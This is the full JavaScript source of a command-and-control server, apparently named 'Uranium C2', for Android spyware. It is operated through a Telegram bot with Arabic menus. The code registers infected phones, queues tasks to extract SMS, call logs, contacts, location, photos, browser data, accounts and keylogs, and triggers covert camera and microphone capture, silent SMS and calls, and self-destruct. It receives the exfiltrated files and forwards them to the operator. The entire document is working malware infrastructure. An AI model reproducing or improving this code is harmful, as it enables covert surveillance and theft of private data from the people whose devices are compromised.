require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();

const TOKEN = process.env.TG_TOKEN;
const CHAT_ID = process.env.TG_ID;
const C2_KEY = process.env.C2_KEY || null;

if (!TOKEN || !CHAT_ID) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

try {
    if (fs.existsSync('./uranium_core_v21.db')) {
        fs.unlinkSync('./uranium_core_v21.db');
        console.log('[DB] Old database deleted.');
    }
} catch (e) {
    console.error('[DB] Failed to delete old database:', e.message);
}

const db = new sqlite3.Database('./uranium_core_v21.db');

db.on('error', (err) => {
    console.error('[DB ERROR]', err.message);
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (
        id TEXT PRIMARY KEY,
        model TEXT,
        android_sdk INTEGER,
        last_seen INTEGER,
        online INTEGER DEFAULT 0,
        secret_hash TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        node_id TEXT,
        action TEXT,
        payload TEXT,
        status TEXT DEFAULT 'PENDING',
        created_at INTEGER,
        sent_at INTEGER
    )`);
});

const app = express();
const appBot = new telegramBot(TOKEN, { polling: { interval: 1500, autoStart: true } });

app.use(express.json({ limit: '100mb' }));
app.use('/api/v3/uranium/upload_raw', express.raw({ type: 'application/octet-stream', limit: '120mb' }));

app.use((err, req, res, next) => {
    console.error('Express:', err.message);
    if (res.headersSent) return next(err);
    res.status(400).json({ error: 'BAD_REQUEST', detail: err.message });
});

let tgQueue = Promise.resolve();
function sendTg(msg, options = {}) {
    tgQueue = tgQueue.then(() => appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }))
        .catch(e => console.error('TG:', e.message));
    return tgQueue;
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function hashSecret(s) {
    if (!s) return null;
    return crypto.createHash('sha256').update(String(s)).digest('hex');
}

function checkAuth(req, res, next) {
    if (C2_KEY && req.headers['x-c2-key'] !== C2_KEY) {
        return res.status(401).json({ error: 'UNAUTHORIZED' });
    }
    next();
}

app.get('/', (req, res) => {
    res.type('html').send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] URANIUM C2 v21.0 — Hardened [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', checkAuth, (req, res) => {
    const nodeId = String(req.headers['x-node-id'] || '').slice(0, 128) || 'unknown';
    const nodeModel = String(req.headers['x-node-model'] || 'Unknown').slice(0, 128);
    const sdk = parseInt(req.headers['x-android-sdk'] || '0') || 0;
    const secretHeader = req.headers['x-device-secret'] || null;
    const secretHash = hashSecret(secretHeader);

    db.get(`SELECT secret_hash FROM nodes WHERE id=?`, [nodeId], (_, existing) => {
        if (existing && existing.secret_hash && secretHash && existing.secret_hash !== secretHash) {
            return res.status(403).json({ status: 'AUTH_FAIL' });
        }
        db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online, secret_hash)
            VALUES (?,?,?,?,1,COALESCE(?, secret_hash))
            ON CONFLICT(id) DO UPDATE SET
                model=excluded.model,
                android_sdk=excluded.android_sdk,
                last_seen=excluded.last_seen,
                online=1,
                secret_hash=COALESCE(excluded.secret_hash, nodes.secret_hash)`,
            [nodeId, nodeModel, sdk, Date.now(), secretHash], (err) => {
                if (err) console.error('[DB INSERT NODE]', err.message);
            });
    });

    const payload = req.body || {};
    if (payload.type === 'TEXT_REPORT') {
        const text = String(payload.data || '').substring(0, 3800);
        if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
        return res.json({ status: 'ACK', task: null });
    }
    if (payload.type === 'TASK_RESULT') {
        if (Number.isInteger(payload.taskId)) {
            db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
        }
        return res.json({ status: 'ACK', task: null });
    }

    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
        if (err || !row) return res.json({ status: 'ACK', task: null });
        db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
        let parsed = {};
        try { parsed = JSON.parse(row.payload || '{}'); } catch (_) {}
        res.json({ status: 'ACK', task: { id: row.id, action: row.action, payload: parsed } });
    });
});

app.post('/api/v3/uranium/upload_raw', checkAuth, async (req, res) => {
    try {
        if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
        if (req.body.length > 120 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });

        const nodeId = String(req.headers['x-node-id'] || 'unknown').replace(/[^\w.-]/g, '').slice(0, 64) || 'unknown';
        const nodeModel = String(req.headers['x-node-model'] || 'Unknown').slice(0, 128);
        const fileName = path.basename(String(req.headers['x-file-name'] || `dump_${Date.now()}.bin`)).replace(/[^\w.-]/g, '_').slice(0, 128);

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen, secret_hash)
                VALUES (?, ?, ?, COALESCE((SELECT secret_hash FROM nodes WHERE id=?), NULL))`,
            [nodeId, nodeModel, Date.now(), nodeId], (err) => {
                if (err) console.error('[DB UPLOAD NODE]', err.message);
            });

        const saveDir = path.join(STORAGE_DIR, nodeId);
        fs.mkdirSync(saveDir, { recursive: true });
        const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(finalPath, req.body);

        const mb = (req.body.length / 1024 / 1024).toFixed(2);
        await sendTg(`☢️ <b>${escapeHtml(fileName)}</b> (${mb}MB) من <code>${escapeHtml(nodeId)}</code>`);
        if (req.body.length <= 45 * 1024 * 1024) {
            try { await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName} (${mb}MB)` }); } catch (_) {}
        }
        res.json({ status: 'OK' });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

appBot.on('polling_error', () => {});
appBot.on('error', (e) => console.error('BOT:', e.message));

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const text = msg.text || '';

    if (text === '/start' || text === '/menu' || text === '/nodes') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 25`, async (_, rows) => {
            if (!rows || !rows.length) return sendTg('⚠️ لا نودات.');
            const now = Date.now();
            const kb = rows.map(n => {
                const online = n.online && (now - (n.last_seen || 0) < 120000);
                return [{ text: `${online ? '🟢' : '⚫'} ${n.model || '?'} (${String(n.id).substring(0, 8)})`, callback_data: `menu_${n.id}` }];
            });
            await sendTg(`☢️ <b>v21 — ${rows.length} نود:</b>`, { reply_markup: { inline_keyboard: kb } });
        });
        return;
    }

    if (text.startsWith('/cmd ')) {
        const parts = text.split(/\s+/);
        if (parts.length < 3) return sendTg('⚠️ Usage: /cmd &lt;nodeId&gt; &lt;ACTION&gt; [json]');
        const [, nodeId, action, jsonRaw] = parts;
        let payload = '{}';
        try { if (jsonRaw) payload = JSON.stringify(JSON.parse(jsonRaw)); } catch (_) {}
        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, ?, 'PENDING', ?)`,
            [nodeId, action, payload, Date.now()], () => sendTg(`☢️ <code>${escapeHtml(action)}</code> → <code>${escapeHtml(nodeId)}</code>`));
        return;
    }
});

appBot.on('callback_query', async (query) => {
    if (String(query.from.id) !== String(CHAT_ID)) return appBot.answerCallbackQuery(query.id, { text: '⛔' });
    const data = query.data || '';
    const msg = query.message;

    try {
        if (data.startsWith('menu_')) {
            const nodeId = data.replace('menu_', '');
            const c = (label, action) => ({ text: label, callback_data: `cmd_${action}_${nodeId}` });
            const kb = { inline_keyboard: [
                [c('🔦 ON', 'CMD_FLASH_ON'), c('🔦 OFF', 'CMD_FLASH_OFF')],
                [c('📳 اهتزاز', 'CMD_VIBRATE'), c('🔊 تنبيه', 'CMD_BEEP')],
                [c('📸 خلفية', 'EXTRACT_CAMERA_SNAP'), c('🤳 أمامية', 'EXTRACT_CAMERA_SNAP_FRONT')],
                [c('🎙️ 6s', 'MIC_AI_LISTEN'), c('👁️ خاطفة', 'MICRO_BURST_SNAP')],
                [c('📨 SMS', 'EXTRACT_SMS'), c('📞 Calls', 'EXTRACT_CALLS')],
                [c('📇 Contacts', 'EXTRACT_CONTACTS'), c('📱 Apps', 'EXTRACT_APPS')],
                [c('📍 GPS', 'EXTRACT_LOCATION'), c('📋 Clipboard', 'EXTRACT_CLIPBOARD')],
                [c('🖼️ 20 صور', 'EXTRACT_PHOTOS'), c('📥 10 فيديو', 'EXTRACT_VIDEOS')],
                [c('📁 DCIM', 'PROC_DCIM'), c('📥 Download', 'PROC_DOWNLOAD')],
                [c('📊 Storage', 'STORAGE_AUDIT'), c('📶 WiFi', 'WIFI_AUTOPILOT')],
                [c('🔑 حسابات', 'EXTRACT_ACCOUNTS'), c('🔔 إشعارات', 'EXTRACT_NOTIFICATIONS')],
                [c('🌐 متصفح', 'EXTRACT_BROWSER'), c('⌨️ كيلوج', 'EXTRACT_KEYLOG')],
                [c('🖥️ شاشة ON', 'CMD_SCREEN_ON'), c('🖥️ شاشة OFF', 'CMD_SCREEN_OFF')],
                [c('📞 اتصل', 'CMD_CALL_NUMBER'), c('✉️ SMS صامت', 'CMD_SEND_SMS')],
                [c('🔊 صوت', 'CMD_PLAY_SOUND'), c('🗣️ TTS', 'CMD_SPEAK_TEXT')],
                [c('📷 سكرين', 'EXTRACT_SCREENSHOT'), c('🔁 rekey', 'POLY_REKEY')],
                [c('🔍 بحث ملف', 'PROC_FILE_SEARCH')],
                [{ text: '💥 Self Destruct', callback_data: `confirm_SELF_${nodeId}` }],
                [{ text: '🔙 رجوع', callback_data: 'back_home' }]
            ] };
            await appBot.editMessageText(`🎯 <b>النود:</b> <code>${escapeHtml(nodeId)}</code> — v21`, {
                chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
            });
        }
        else if (data.startsWith('confirm_SELF_')) {
            const nodeId = data.replace('confirm_SELF_', '');
            await appBot.editMessageText(`⚠️ <b>تأكيد النسف</b> <code>${escapeHtml(nodeId)}</code>؟`, {
                chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[
                    { text: '✅ نعم', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
                    { text: '❌ إلغاء', callback_data: `menu_${nodeId}` }
                ]] }
            });
        }
        else if (data.startsWith('cmd_')) {
            const parts = data.split('_');
            const targetNodeId = parts.pop();
            const action = parts.slice(1).join('_');
            db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
                [targetNodeId, action, Date.now()], async () => {
                    await appBot.answerCallbackQuery(query.id, { text: `☢️ ${action}` });
                });
        }
        else if (data === 'back_home') {
            await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
        }
    } catch (e) {
        console.error('CB:', e.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium C2 v21.0 on :${PORT}`));
